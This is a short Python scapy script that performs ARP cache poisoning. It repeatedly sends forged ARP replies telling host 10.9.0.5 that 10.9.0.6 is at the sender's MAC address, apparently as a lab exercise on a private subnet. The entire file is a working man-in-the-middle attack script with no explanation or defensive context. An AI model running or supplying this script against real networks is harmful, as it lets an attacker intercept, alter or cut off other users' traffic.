from scapy.all import *
import time

def spoofarpcache(targetip, targetmac, sourceip):
    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)

def main():
    try:
        print ("Sending spoofed ARP responses")
        my_mac = get_if_hwaddr(conf.iface)
        while True:
            spoofarpcache("10.9.0.5", my_mac, "10.9.0.6")
            print (f"Hey there! I'm 10.9.0.6 at ", my_mac)
            time.sleep(1.5)
    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        quit()

if __name__=="__main__":
    main()

